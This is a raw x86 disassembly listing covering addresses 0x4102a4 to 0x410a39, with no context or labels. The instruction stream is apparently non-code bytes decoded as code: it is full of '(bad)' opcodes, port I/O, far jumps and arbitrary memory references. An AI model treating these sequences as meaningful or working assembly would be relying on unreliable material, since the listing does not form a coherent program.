  4102a4:	mov    eax,ds:0xc36788c
  4102a9:	jecxz  0x410241
  4102ab:	mov    al,0x27
  4102ad:	or     BYTE PTR [eax+0x62b6d75e],bl
  4102b3:	and    edx,DWORD PTR [eax]
  4102b5:	push   edi
  4102b6:	shl    BYTE PTR [ebx-0x194e9551],0x1e
  4102bd:	outs   dx,BYTE PTR ds:[esi]
  4102be:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4102bf:	xor    DWORD PTR [ebx],esi
  4102c1:	icebp  
  4102c2:	in     eax,dx
  4102c3:	xlat   BYTE PTR ds:[ebx]
  4102c4:	aaa    
  4102c5:	das    
  4102c6:	addr16 mov bh,0x3c
  4102c9:	xchg   edx,eax
  4102ca:	shl    BYTE PTR [ebx+0x6a503b46],1
  4102d0:	xchg   esp,eax
  4102d1:	push   0x1dc726c8
  4102d6:	int    0xc0
  4102d8:	lahf   
  4102d9:	dec    esp
  4102da:	xchg   edi,eax
  4102db:	xor    BYTE PTR [edx-0x5a],dh
  4102de:	sbb    al,0xae
  4102e1:	mov    DWORD PTR [ecx+0x6260fb01],eax
  4102e7:	adc    eax,0x15d2ff85
  4102ec:	jo     0x4102b4
  4102ee:	push   ds
  4102ef:	jg     0x4102f2
  4102f1:	(bad)  
  4102f2:	lods   al,BYTE PTR ds:[esi]
  4102f3:	in     eax,dx
  4102f4:	outs   dx,BYTE PTR ds:[esi]
  4102f5:	and    al,0xa9
  4102f7:	push   0x75736001
  4102fc:	fcmovnb st,st(4)
  4102fe:	xchg   ebx,eax
  4102ff:	aas    
  410300:	mov    dl,bh
  410302:	cli    
  410303:	imul   edx,DWORD PTR [esi+0x73],0xffffffab
  410307:	rcl    DWORD PTR [edi-0x3656dc67],1
  41030d:	in     al,dx
  41030e:	aam    0x78
  410310:	push   0xffffffda
  410312:	add    ebp,ebp
  410314:	sub    DWORD PTR [ebp-0x2a3bf472],edi
  41031a:	mov    DWORD PTR ds:0x3461503f,ebx
  410320:	push   esi
  410321:	adc    al,0x7f
  410323:	dec    esp
  410324:	add    al,0x30
  410326:	(bad)  
  410327:	call   FWORD PTR [esi+0x37abb8a8]
  41032d:	gs (bad) 
  41032f:	adc    eax,0x72989c32
  410334:	(bad)  
  410335:	mov    ds:0x6c0dd0c,al
  41033a:	fs cld 
  41033c:	lds    edx,FWORD PTR [esi]
  41033e:	neg    DWORD PTR [edi-0x6d9148ec]
  410344:	dec    edi
  410345:	cmp    eax,0xed9e4a02
  41034a:	pop    ecx
  41034b:	enter  0x1aec,0xc2
  41034f:	jmp    0x4102d7
  410351:	out    0x58,al
  410353:	nop
  410354:	xor    BYTE PTR [ebp+0x3b79fd88],bh
  41035a:	mov    WORD PTR [edx],fs
  41035c:	es cs pop edx
  41035f:	test   eax,0x987e5a51
  410364:	jge    0x410368
  410366:	pop    ecx
  410367:	or     eax,0x36215784
  41036c:	imul   eax,DWORD PTR [eax+0xb],0x1785a10d
  410373:	push   esp
  410374:	lods   eax,DWORD PTR ds:[esi]
  410375:	mov    dl,0x5c
  410377:	jns    0x410353
  410379:	clc    
  41037a:	cmp    dl,ah
  41037c:	cmp    DWORD PTR [ebx],0x8894162
  410382:	push   eax
  410383:	out    dx,eax
  410384:	jb     0x4103dd
  410386:	test   BYTE PTR [eax+0x77],al
  410389:	cmp    edx,DWORD PTR [esi-0x42416d18]
  41038f:	int    0xb4
  410391:	loop   0x4103a8
  410393:	int    0x51
  410395:	add    dh,al
  410397:	rcr    BYTE PTR ds:0x420a4c8e,0xc2
  41039e:	popa   
  41039f:	mov    bh,0x5c
  4103a1:	ja     0x4103ed
  4103a3:	xor    BYTE PTR [esp+ebp*4],dh
  4103a6:	pop    ds
  4103a7:	lods   eax,DWORD PTR ds:[esi]
  4103a8:	cwde   
  4103a9:	mov    ds:0xac3f8dbc,al
  4103ae:	mov    esp,0x9e8aedf0
  4103b3:	mov    esi,0x18aacc54
  4103b8:	cmc    
  4103b9:	jl     0x4103b9
  4103bb:	(bad)  
  4103bc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4103bd:	in     al,0x10
  4103bf:	int    0x9f
  4103c1:	xor    BYTE PTR [eax+0x8],dh
  4103c4:	test   DWORD PTR [esi],eax
  4103c6:	mov    ss,WORD PTR [edi]
  4103c8:	cmc    
  4103c9:	(bad)  
  4103ca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4103cb:	mov    bl,0xdc
  4103cd:	inc    edi
  4103ce:	hlt    
  4103cf:	cld    
  4103d0:	mov    dl,0xcc
  4103d2:	rol    dl,0x5e
  4103d5:	(bad)  
  4103d6:	xor    ebp,DWORD PTR cs:[edi-0x16f5db04]
  4103dd:	inc    eax
  4103de:	aad    0x47
  4103e0:	in     eax,dx
  4103e1:	mov    cs,WORD PTR [edi-0x48]
  4103e4:	iret   
  4103e5:	inc    ecx
  4103e6:	fimul  WORD PTR [esi-0x72]
  4103e9:	stos   DWORD PTR es:[edi],eax
  4103ea:	mov    DWORD PTR [ecx+edi*8-0x54c62f83],ebp
  4103f1:	and    al,0x3c
  4103f3:	test   al,0x59
  4103f5:	out    0x86,eax
  4103f7:	loop   0x4103bb
  4103f9:	xor    al,0x63
  4103fb:	sbb    DWORD PTR [ecx],0x8ab7e432
  410401:	adc    edx,DWORD PTR [edi+0x6e]
  410404:	and    al,0x3f
  410406:	mov    edi,0xdd8023a5
  41040b:	jmp    0xc03a:0x565f1997
  410412:	repz (bad) 
  410414:	jne    0x4103f2
  410416:	push   eax
  410417:	dec    esi
  410418:	mov    edi,0xf490f0c
  41041d:	ins    BYTE PTR es:[edi],dx
  41041e:	dec    eax
  41041f:	xchg   ecx,eax
  410420:	cld    
  410421:	cmp    al,0xa9
  410423:	pop    ds
  410424:	cmp    bh,ch
  410426:	sub    DWORD PTR [eax+0x41],ebx
  410429:	or     DWORD PTR [esi-0x4f],edi
  41042c:	xchg   esp,eax
  41042d:	out    0x67,eax
  41042f:	in     al,0x8f
  410431:	sub    al,0x5c
  410433:	aad    0x4e
  410435:	dec    ebx
  410436:	jg     0x4103d3
  410438:	lds    edx,FWORD PTR [ecx-0x18]
  41043b:	inc    ecx
  41043c:	and    cl,bh
  41043e:	mov    ds:0x161e2827,al
  410443:	xor    eax,0xfbd104d5
  410448:	sub    al,0x1
  41044a:	repz ss retf 0x4af2
  41044f:	mov    ebp,0xa7fa013c
  410454:	or     eax,0x8002da43
  410459:	lea    eax,[edx+0x1e]
  41045c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41045d:	icebp  
  41045e:	lock add DWORD PTR [ebx+0x5b03eefc],esp
  410465:	pop    ebx
  410466:	cmp    al,0xaf
  410468:	jo     0x410405
  41046a:	daa    
  41046b:	in     eax,dx
  41046c:	sbb    DWORD PTR [ecx],0xffffff92
  41046f:	in     al,dx
  410470:	rcl    BYTE PTR [edi-0x6bf9bf9d],1
  410476:	jae    0x4103ff
  410478:	inc    eax
  410479:	pop    edi
  41047a:	add    edi,DWORD PTR [esi+0x30]
  41047d:	or     eax,0x62623065
  410482:	push   edi
  410483:	fiadd  WORD PTR [ecx-0x6e0c8e6]
  410489:	ffreep st(3)
  41048b:	xlat   BYTE PTR ds:[ebx]
  41048c:	idiv   eax
  41048e:	adc    eax,DWORD PTR [ecx-0x66]
  410491:	pop    edx
  410492:	lods   eax,DWORD PTR ds:[esi]
  410493:	pop    esp
  410494:	fs jo  0x410427
  410497:	mov    ds:0xf737341b,eax
  41049c:	popa   
  41049d:	fisubr DWORD PTR [ebx-0x8]
  4104a0:	inc    edx
  4104a1:	loopne 0x410467
  4104a3:	pop    ebx
  4104a4:	ds pop ecx
  4104a6:	mov    ecx,DWORD PTR [eax]
  4104a8:	jg     0x4104af
  4104aa:	pushf  
  4104ab:	xor    DWORD PTR [edi+0x601e001f],esi
  4104b1:	mov    esp,0xf57cb376
  4104b6:	(bad)  
  4104b7:	xchg   BYTE PTR [edx+0x7d],ch
  4104ba:	push   eax
  4104bb:	ss jl  0x4104d9
  4104be:	push   ss
  4104bf:	adc    DWORD PTR [esi+0x9513057],ecx
  4104c5:	push   ebp
  4104c6:	sbb    esi,esi
  4104c8:	xchg   dl,ch
  4104ca:	add    cl,BYTE PTR [edx]
  4104cc:	or     ch,BYTE PTR [ebx]
  4104ce:	cwde   
  4104cf:	inc    edx
  4104d0:	sysenter 
  4104d2:	xchg   esp,eax
  4104d3:	mov    WORD PTR [edx+0x5a],gs
  4104d6:	add    ecx,DWORD PTR [edx]
  4104d8:	daa    
  4104d9:	add    ebx,DWORD PTR [ecx]
  4104db:	sub    dl,BYTE PTR [ebp+0x5]
  4104de:	pop    ss
  4104df:	icebp  
  4104e0:	xlat   BYTE PTR ds:[ebx]
  4104e1:	inc    ecx
  4104e2:	(bad)  
  4104e3:	ds int3 
  4104e5:	scas   eax,DWORD PTR es:[edi]
  4104e6:	addr16 inc ebx
  4104e8:	adc    DWORD PTR [edx+0x111d119a],esp
  4104ee:	push   ecx
  4104ef:	adc    al,0x22
  4104f1:	out    0xb0,al
  4104f3:	cmp    esi,esi
  4104f5:	imul   esi,DWORD PTR ds:0x1229a3d5,0xffffffcb
  4104fc:	mov    WORD PTR ds:0xa0589667,gs
  410502:	mul    DWORD PTR [esi-0x2f2c8e80]
  410508:	fist   WORD PTR [edi]
  41050a:	xor    DWORD PTR [ebx-0x33f4939],ecx
  410510:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410511:	inc    eax
  410512:	aaa    
  410513:	loope  0x41054a
  410515:	je     0x4104bc
  410517:	and    edi,ecx
  410519:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41051a:	scas   al,BYTE PTR es:[edi]
  41051b:	les    edx,FWORD PTR [ecx]
  41051d:	rcl    BYTE PTR [eax+eax*2],cl
  410520:	mov    BYTE PTR [esi],bh
  410522:	jecxz  0x4104cf
  410524:	daa    
  410525:	test   eax,edx
  410527:	push   esi
  410528:	fwait
  410529:	sbb    ebp,DWORD PTR [esp+eiz*2-0x279b80fe]
  410530:	data16 jle 0x4104b5
  410533:	mov    eax,0xd1915ec4
  410538:	ins    BYTE PTR es:[edi],dx
  410539:	data16 fcmovbe st,st(1)
  41053c:	pusha  
  41053d:	sbb    ch,BYTE PTR [edx+eiz*4-0x65]
  410541:	mov    edx,0x5ead48de
  410546:	gs or  cl,dl
  410549:	mov    edx,0x63cb7fb8
  41054e:	adc    eax,0x84aa2abc
  410553:	outs   dx,WORD PTR ds:[esi]
  410555:	pushf  
  410556:	xor    al,0xa9
  410558:	xor    ebx,DWORD PTR [edi]
  41055a:	push   ebx
  41055b:	rcr    esi,1
  41055d:	into   
  41055e:	test   BYTE PTR [ecx+0x4c9ecf88],dh
  410564:	and    al,0x6a
  410566:	test   eax,0x279b9954
  41056b:	imul   esi,DWORD PTR ds:0x3afec710,0x9
  410572:	pop    edi
  410573:	stos   DWORD PTR es:[edi],eax
  410574:	aas    
  410575:	lock cli 
  410577:	dec    esi
  410578:	xchg   ecx,eax
  410579:	xor    esp,eax
  41057b:	add    al,BYTE PTR [eax+edx*4+0x53186a24]
  410582:	jns    0x410532
  410584:	ds cmc 
  410586:	(bad)  
  410587:	push   cs
  410588:	stos   DWORD PTR es:[edi],eax
  410589:	push   edi
  41058a:	mov    BYTE PTR [eax],0x5e
  41058d:	pop    edi
  41058e:	dec    ebp
  41058f:	not    DWORD PTR [eax+0x62534f01]
  410595:	mov    ch,BYTE PTR [ebx-0x11]
  410598:	and    DWORD PTR [eax],ebp
  41059a:	test   al,0xee
  41059c:	mov    ds:0x821833c,eax
  4105a1:	ret    0x642f
  4105a4:	sbb    eax,0xefeb7065
  4105a9:	cli    
  4105aa:	xchg   ebx,eax
  4105ab:	jbe    0x4105f6
  4105ad:	popf   
  4105ae:	(bad)  
  4105af:	jp     0x410591
  4105b1:	lea    ecx,ds:0x4626220c
  4105b7:	clc    
  4105b8:	add    al,0x38
  4105ba:	ja     0x41060b
  4105bc:	aam    0xcd
  4105be:	arpl   WORD PTR [ebx+0x2d],bp
  4105c1:	dec    ecx
  4105c2:	push   cs
  4105c3:	xchg   edi,eax
  4105c4:	sbb    al,0x46
  4105c6:	int3   
  4105c7:	int    0x6f
  4105c9:	outs   dx,DWORD PTR ds:[esi]
  4105ca:	push   ds
  4105cb:	push   ds
  4105cc:	inc    edi
  4105cd:	out    dx,eax
  4105ce:	mov    edi,0xcd810c57
  4105d3:	test   al,0x23
  4105d5:	neg    BYTE PTR [ecx-0x329a9a8b]
  4105db:	ins    BYTE PTR es:[edi],dx
  4105dc:	shr    DWORD PTR [edx+0x78],1
  4105df:	xor    esi,DWORD PTR [edx]
  4105e1:	test   BYTE PTR [ebp+0x4c],0xee
  4105e5:	cmp    ebp,0xffffffea
  4105e8:	push   es
  4105e9:	mov    dh,0x92
  4105eb:	pop    es
  4105ec:	das    
  4105ed:	sbb    ah,dh
  4105ef:	mov    eax,ds:0x461ae7dc
  4105f4:	sub    eax,DWORD PTR [edx]
  4105f6:	pushf  
  4105f7:	sbb    DWORD PTR [esi+0x64],ebx
  4105fa:	or     BYTE PTR [ebx+0x45],dl
  4105fd:	pop    ebp
  4105fe:	pop    ebp
  4105ff:	das    
  410600:	xchg   ecx,eax
  410601:	add    DWORD PTR [ecx+edi*8],ecx
  410604:	fbstp  TBYTE PTR ds:0xc791fee7
  41060a:	sbb    eax,0xc17c316e
  41060f:	mov    dl,0x73
  410611:	call   0xf08c:0x1ea4a915
  410618:	gs push edx
  41061a:	pushf  
  41061b:	pusha  
  41061c:	in     al,dx
  41061d:	popf   
  41061e:	dec    esp
  41061f:	aam    0xa3
  410621:	popf   
  410622:	fcomp  QWORD PTR [edi]
  410624:	pop    esi
  410625:	fdivp  st(6),st
  410627:	outs   dx,DWORD PTR es:[esi]
  410629:	jg     0x410649
  41062b:	push   0xffffff92
  41062d:	cmp    ch,BYTE PTR [eax]
  41062f:	mov    ch,BYTE PTR [ecx-0x6475df5f]
  410635:	pushf  
  410636:	adc    al,BYTE PTR [ebx+0x4]
  410639:	push   es
  41063a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41063b:	dec    edi
  41063c:	inc    edi
  41063d:	inc    eax
  41063e:	cmp    al,0xd1
  410640:	repz leave 
  410642:	lock jae 0x410664
  410645:	dec    ecx
  410646:	dec    ebp
  410647:	in     al,0x97
  410649:	push   esp
  41064a:	data16 js 0x41063b
  41064d:	mov    al,ds:0xda765471
  410652:	jns    0x410676
  410654:	inc    ecx
  410655:	xchg   edi,eax
  410656:	jnp    0x4106b9
  410658:	out    0xcd,al
  41065a:	shl    BYTE PTR [edi+0x18],0xef
  41065e:	ins    DWORD PTR es:[edi],dx
  41065f:	mov    edx,DWORD PTR [eax]
  410661:	fwait
  410662:	shr    BYTE PTR [edi+0xb],0x5
  410666:	rol    BYTE PTR [ebp-0x22a6633c],0x9d
  41066d:	fcom   DWORD PTR [ecx-0x64]
  410670:	rol    dh,cl
  410672:	stc    
  410673:	loope  0x410671
  410675:	add    BYTE PTR [eax-0x6f],0x7f
  410679:	and    dl,ch
  41067b:	jbe    0x410653
  41067d:	push   0x13
  41067f:	stc    
  410680:	stos   DWORD PTR es:[edi],eax
  410681:	js     0x4106e2
  410683:	inc    ecx
  410684:	es aam 0x25
  410687:	ret    0x2733
  41068a:	sbb    DWORD PTR ds:0x218855a7,ebx
  410690:	(bad)  
  410691:	sub    ecx,DWORD PTR [esi-0xfcfdc89]
  410697:	inc    ebx
  410698:	cmp    bh,BYTE PTR ds:0xe61f3410
  41069e:	jl     0x410718
  4106a0:	mov    al,0xd3
  4106a2:	xor    eax,0x53200be7
  4106a7:	bound  ebx,QWORD PTR [ecx-0x33]
  4106aa:	xchg   ah,bl
  4106ac:	mov    edi,0x4e2cedde
  4106b1:	loop   0x4106f1
  4106b3:	adc    al,0xf8
  4106b5:	cmp    dl,bl
  4106b7:	fnstenv [ebp-0x75]
  4106ba:	push   es
  4106bb:	mov    ebx,0xf3704df
  4106c0:	int3   
  4106c1:	and    DWORD PTR [edi+0x67],esi
  4106c4:	nop
  4106c5:	adc    al,0xe0
  4106c7:	aaa    
  4106c8:	cld    
  4106c9:	sbb    DWORD PTR [eax],ebp
  4106cb:	cli    
  4106cc:	inc    edi
  4106cd:	hlt    
  4106ce:	push   esp
  4106cf:	lods   al,BYTE PTR ds:[esi]
  4106d0:	and    eax,0x928f6834
  4106d5:	test   DWORD PTR [edi-0x33],0x83831931
  4106dc:	pop    ds
  4106dd:	and    edx,0x8f509a31
  4106e3:	dec    esp
  4106e4:	dec    ecx
  4106e5:	inc    ebx
  4106e6:	and    bl,BYTE PTR ds:0x653c7393
  4106ec:	mov    al,0x1b
  4106ee:	stos   BYTE PTR es:[edi],al
  4106ef:	cmp    al,0x2f
  4106f1:	out    dx,al
  4106f2:	xchg   esi,eax
  4106f3:	popa   
  4106f4:	inc    ebp
  4106f5:	loop   0x410705
  4106f7:	ds loop 0x4106df
  4106fa:	loopne 0x410703
  4106fc:	fldz   
  4106fe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4106ff:	lock lods al,BYTE PTR ds:[esi]
  410701:	mov    eax,ds:0x8d9e0242
  410706:	pusha  
  410707:	call   0xf390:0xb106fae1
  41070e:	repnz mov esp,0xc76cc748
  410714:	std    
  410715:	sbb    eax,0x6c9f1a00
  41071a:	shl    DWORD PTR [ecx+0x77],1
  41071d:	add    ebx,ebp
  41071f:	inc    eax
  410720:	xor    dh,dh
  410722:	or     BYTE PTR [ecx-0x71b62b6d],ah
  410728:	jge    0x410778
  41072a:	xor    BYTE PTR [ecx],0xba
  41072d:	jmp    0xc158:0x8805a0ef
  410734:	add    al,0xf3
  410736:	sub    al,0x1b
  410738:	mov    ebp,0x4e67c37d
  41073d:	sbb    DWORD PTR [ebp-0x46],edi
  410740:	fwait
  410741:	xchg   esp,eax
  410742:	je     0x410791
  410744:	aam    0x2b
  410746:	pop    edi
  410747:	jno    0x410711
  410749:	pop    edi
  41074a:	or     eax,0x987aebaa
  41074f:	shl    BYTE PTR [edx],1
  410751:	add    eax,0x1c4c906f
  410756:	js     0x4107af
  410758:	fiadd  WORD PTR [ecx-0x80]
  41075b:	adc    BYTE PTR [ecx-0x72],dl
  41075e:	shl    BYTE PTR [ebp+0x4c],0x56
  410762:	jmp    0x4107d0
  410764:	mov    ss,esp
  410766:	popa   
  410767:	push   esi
  410768:	pop    ss
  410769:	jmp    0x4107b6
  41076b:	paddsw mm1,QWORD PTR [esi+0x59bff8ad]
  410772:	adc    bh,BYTE PTR [edx+0x2e94065e]
  410778:	mov    dl,0x26
  41077a:	push   ss
  41077b:	daa    
  41077c:	fwait
  41077d:	xchg   ebx,eax
  41077e:	(bad)  
  41077f:	jne    0x41070c
  410781:	(bad)  
  410783:	and    BYTE PTR [ebp+0x1c],ah
  410786:	push   ss
  410787:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410788:	pop    esi
  410789:	adc    eax,0xeaf20ffb
  41078e:	repnz mov dh,0xf1
  410791:	pop    es
  410792:	mov    eax,0xc8c51279
  410797:	loope  0x4107d2
  410799:	jno    0x41075a
  41079b:	cli    
  41079c:	pop    eax
  41079d:	imul   esp,DWORD PTR [edx],0xb36f3e8e
  4107a3:	fcomp  QWORD PTR [ebp+esi*2+0x30]
  4107a7:	lods   al,BYTE PTR ds:[esi]
  4107a8:	aad    0x79
  4107aa:	jnp    0x410734
  4107ac:	cmp    DWORD PTR [edi],ecx
  4107ae:	ins    DWORD PTR es:[edi],dx
  4107af:	jns    0x41080c
  4107b1:	aaa    
  4107b2:	sub    al,0x8b
  4107b4:	loopne 0x410829
  4107b6:	mov    dh,0xce
  4107b8:	sub    esp,esp
  4107ba:	sub    esi,DWORD PTR [edx-0x6edc20b8]
  4107c0:	icebp  
  4107c1:	push   ds
  4107c2:	xor    eax,0x95f97eee
  4107c7:	aad    0xaf
  4107c9:	jg     0x410840
  4107cb:	out    dx,eax
  4107cc:	mov    dl,0x92
  4107ce:	mov    esp,0xfb09059b
  4107d3:	and    bl,BYTE PTR [esp+ebp*2-0x24]
  4107d7:	push   ss
  4107d8:	ret    
  4107d9:	jmp    0x41085a
  4107db:	or     al,0xa
  4107dd:	mov    al,0x53
  4107df:	mov    ch,ch
  4107e1:	shl    DWORD PTR [edx],0xaa
  4107e4:	adc    edi,DWORD PTR [bx+di+0x3b]
  4107e8:	and    bl,BYTE PTR [esi-0x4ce87dae]
  4107ee:	sahf   
  4107ef:	inc    ebx
  4107f0:	jmp    0x69e1683a
  4107f5:	sub    eax,0x3e0a7a33
  4107fa:	repnz imul esi,DWORD PTR [edi+0x17142612],0xb96406d8
  410805:	int    0xcc
  410807:	inc    ebp
  410808:	das    
  410809:	hlt    
  41080a:	popf   
  41080b:	pushf  
  41080c:	mov    eax,0x2304be2a
  410811:	mov    esp,0xc6f5e0bb
  410816:	jge    0x41084d
  410818:	(bad)  
  410819:	cli    
  41081a:	outs   dx,BYTE PTR ds:[esi]
  41081b:	mov    edi,0xf69e5617
  410820:	sub    eax,0xfcf064bb
  410825:	clc    
  410826:	xlat   BYTE PTR ss:[ebx]
  410828:	sahf   
  410829:	pop    ecx
  41082a:	adc    dh,0xe3
  41082d:	cmp    al,BYTE PTR [eax-0x6581e31]
  410833:	add    bl,ch
  410835:	stc    
  410836:	cmc    
  410837:	int    0xe0
  410839:	dec    ebx
  41083a:	std    
  41083b:	mov    eax,DWORD PTR [ebp+0x3bb7bbda]
  410841:	aas    
  410842:	or     DWORD PTR [eax+0x5b],ebp
  410845:	out    0x33,eax
  410847:	jae    0x41080a
  410849:	fdiv   DWORD PTR [edi+0x22]
  41084c:	pusha  
  41084d:	xchg   esi,eax
  41084e:	les    edx,FWORD PTR [edx]
  410850:	(bad)  
  410851:	mov    DWORD PTR [esi+eax*2-0x75298f],0xb21c2482
  41085c:	rcr    BYTE PTR [esi],1
  41085e:	lock in eax,dx
  410860:	jne    0x4107e3
  410862:	(bad)  
  410863:	jnp    0x410837
  410865:	xor    DWORD PTR [eax+0x5b],ebx
  410868:	add    ch,ah
  41086a:	in     eax,dx
  41086b:	arpl   WORD PTR [edi+0x4daa61db],cx
  410871:	test   eax,0x3c902880
  410876:	dec    ebx
  410877:	and    DWORD PTR [edx-0x5b],ebx
  41087a:	sub    ecx,DWORD PTR [eax]
  41087c:	outs   dx,DWORD PTR ds:[esi]
  41087d:	repnz out 0x89,eax
  410880:	xchg   esi,eax
  410881:	(bad)  
  410883:	int    0x89
  410885:	int    0xb8
  410887:	sub    ebp,DWORD PTR [ebx+0x2f]
  41088a:	sub    eax,0xec2bf27e
  41088f:	inc    ecx
  410890:	arpl   si,si
  410892:	rcr    DWORD PTR [ecx+0x1b],0x2d
  410896:	cld    
  410897:	(bad)  
  410899:	mov    esp,DWORD PTR [esi-0x49]
  41089c:	jo     0x410838
  41089e:	inc    eax
  41089f:	xchg   ebp,eax
  4108a0:	adc    bl,BYTE PTR [ecx]
  4108a2:	shl    DWORD PTR [edx+0x2183f2e7],1
  4108a8:	push   eax
  4108a9:	out    0xf6,al
  4108ab:	stos   BYTE PTR es:[edi],al
  4108ac:	mov    dh,0xe6
  4108ae:	push   0xffffffe9
  4108b0:	pop    ss
  4108b1:	lea    edx,[edi+esi*8-0x73ea63dd]
  4108b8:	mov    edx,ds
  4108ba:	add    ah,dh
  4108bc:	mov    bh,0x8c
  4108be:	push   edx
  4108bf:	adc    DWORD PTR [ecx],ecx
  4108c1:	out    0xff,eax
  4108c3:	arpl   WORD PTR [eax-0x37],bp
  4108c6:	sub    bl,BYTE PTR [edx]
  4108c8:	cmc    
  4108c9:	add    eax,0xd293fed5
  4108ce:	rcr    DWORD PTR [ebp+0x4db72769],cl
  4108d4:	cwde   
  4108d5:	add    eax,ebx
  4108d7:	pop    ecx
  4108d8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4108d9:	xchg   ecx,eax
  4108da:	xor    eax,0x5536a0bb
  4108df:	push   0x70
  4108e1:	xchg   edx,eax
  4108e2:	in     eax,dx
  4108e3:	fimul  WORD PTR [esi+edx*4+0x1800dc5c]
  4108ea:	int    0x31
  4108ec:	inc    ebx
  4108ed:	push   es
  4108ee:	aad    0x69
  4108f0:	cdq    
  4108f1:	push   eax
  4108f2:	or     BYTE PTR [ecx+edx*2+0x380b24d2],bh
  4108f9:	xchg   esi,eax
  4108fa:	ins    BYTE PTR es:[edi],dx
  4108fb:	repz sub ch,al
  4108fe:	cmp    bh,BYTE PTR [edx]
  410900:	sahf   
  410901:	sub    DWORD PTR [edi+0x5bdc40a0],0x81dfd129
  41090b:	pop    ecx
  41090c:	jne    0x4108d3
  41090e:	lahf   
  41090f:	push   0x4a278daf
  410914:	xlat   BYTE PTR ds:[ebx]
  410915:	xor    al,0x64
  410917:	and    ch,dl
  410919:	shl    ebp,0x8f
  41091c:	push   edx
  41091d:	and    bl,BYTE PTR [eax]
  41091f:	cli    
  410920:	pop    es
  410921:	(bad)  
  410922:	fmul   DWORD PTR [ebx]
  410924:	fldcw  WORD PTR [esi-0x47cdaca]
  41092a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41092b:	add    bl,BYTE PTR [eax-0x47c505dd]
  410931:	mov    ecx,0xfec3a15a
  410936:	ss mov ah,0x9e
  410939:	cmp    ch,BYTE PTR [edx]
  41093b:	leave  
  41093c:	out    dx,eax
  41093d:	enter  0xf5da,0xa9
  410941:	mov    bl,0xae
  410943:	dec    ecx
  410944:	lahf   
  410945:	add    al,0x1b
  410947:	xor    BYTE PTR [esi-0x2b],dh
  41094a:	xchg   esi,eax
  41094b:	(bad)  
  41094c:	jmp    0x4108e7
  41094e:	in     al,0x45
  410950:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410951:	or     esi,DWORD PTR [edx+esi*8+0x3a]
  410955:	xor    BYTE PTR [ecx-0x3c836a10],ah
  41095b:	es add eax,0x16d08b8
  410961:	push   edx
  410962:	adc    edx,DWORD PTR [esi+0x1b044143]
  410968:	lds    eax,FWORD PTR [ebx]
  41096a:	sbb    eax,0xc449e124
  41096f:	jp     0x41097b
  410971:	inc    edi
  410972:	or     BYTE PTR [esi],dl
  410974:	test   BYTE PTR [eax],al
  410976:	or     al,ch
  410978:	les    ecx,FWORD PTR [ebp-0x5c3669ab]
  41097e:	mov    bh,0xb2
  410980:	popa   
  410981:	loopne 0x4109f8
  410983:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410984:	push   0xffffffd3
  410986:	sub    BYTE PTR [edx+0x17],0x58
  41098a:	adc    DWORD PTR [ebx+edx*4+0x7170e696],esp
  410991:	xchg   edx,eax
  410992:	pop    ss
  410993:	aam    0xc3
  410995:	pop    ss
  410996:	fwait
  410997:	test   BYTE PTR [ebp+0x36],dh
  41099a:	pop    eax
  41099b:	dec    edi
  41099c:	and    eax,0xe35d642
  4109a1:	jge    0x41093a
  4109a3:	jns    0x4109c0
  4109a5:	ss pop edi
  4109a7:	xchg   esp,eax
  4109a8:	jg     0x4109c8
  4109aa:	adc    ebp,ebx
  4109ac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4109ad:	or     cl,BYTE PTR [ecx+ebp*4]
  4109b0:	test   al,0x27
  4109b2:	xchg   ebp,eax
  4109b3:	stc    
  4109b4:	ds aas 
  4109b6:	loopne 0x4109a8
  4109b8:	loop   0x41094e
  4109ba:	cld    
  4109bb:	retf   
  4109bc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4109bd:	iret   
  4109be:	jbe    0x4109a4
  4109c0:	mov    ch,0xff
  4109c2:	lds    esp,FWORD PTR [esi+0x25f19603]
  4109c8:	xor    eax,0x210c0dec
  4109cd:	out    dx,al
  4109ce:	sub    BYTE PTR [esi-0x18],bh
  4109d1:	sub    BYTE PTR [esi],ah
  4109d3:	(bad)  
  4109d4:	hlt    
  4109d5:	add    DWORD PTR [edi+0x3a],ecx
  4109d8:	outs   dx,DWORD PTR ds:[esi]
  4109d9:	in     eax,0x11
  4109db:	mov    esp,0x61b23466
  4109e0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4109e1:	push   ds
  4109e2:	arpl   cx,cx
  4109e4:	or     DWORD PTR [ebp-0x1c],ebx
  4109e7:	idiv   DWORD PTR [edx]
  4109e9:	cmp    eax,0x96d826a
  4109ee:	outs   dx,BYTE PTR ds:[esi]
  4109ef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4109f0:	mul    ecx
  4109f2:	xlat   BYTE PTR ds:[ebx]
  4109f3:	leave  
  4109f4:	jnp    0x4109c4
  4109f6:	xchg   edi,eax
  4109f7:	outs   dx,DWORD PTR ds:[esi]
  4109f8:	enter  0x2c65,0xb0
  4109fc:	sbb    BYTE PTR ds:0x890014b2,0x5b
  410a03:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410a04:	aas    
  410a05:	call   0xec76:0xef41c35d
  410a0c:	(bad)  
  410a0d:	pop    edx
  410a0e:	and    eax,DWORD PTR [eax-0x2e0fdf12]
  410a14:	js     0x4109e3
  410a16:	dec    eax
  410a17:	mov    al,ds:0xbab7d74
  410a1c:	xor    bl,BYTE PTR [ebx+ebp*1-0x1c]
  410a20:	cmp    al,0xbc
  410a22:	mov    DWORD PTR [ebx-0x3e6689ba],ecx
  410a28:	icebp  
  410a29:	inc    esp
  410a2a:	test   eax,0x5b553f1d
  410a2f:	test   DWORD PTR [esi+edx*1],ecx
  410a32:	loop   0x410a95
  410a34:	ins    BYTE PTR es:[edi],dx
  410a35:	aas    
  410a36:	aad    0xb
  410a38:	clc    
  410a39:	pop    ds
